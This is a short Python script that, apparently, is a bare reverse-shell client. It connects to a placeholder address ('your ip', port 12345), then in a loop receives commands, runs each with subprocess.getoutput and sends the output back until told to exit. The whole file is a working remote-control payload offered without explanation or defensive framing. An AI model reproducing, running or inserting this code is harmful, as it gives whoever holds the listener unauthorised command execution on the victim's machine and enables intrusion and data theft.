import socket
import subprocess


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("your ip",12345))
while True:
    command = s.recv(1024).decode()
    if command == 'exit':
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())

s.close()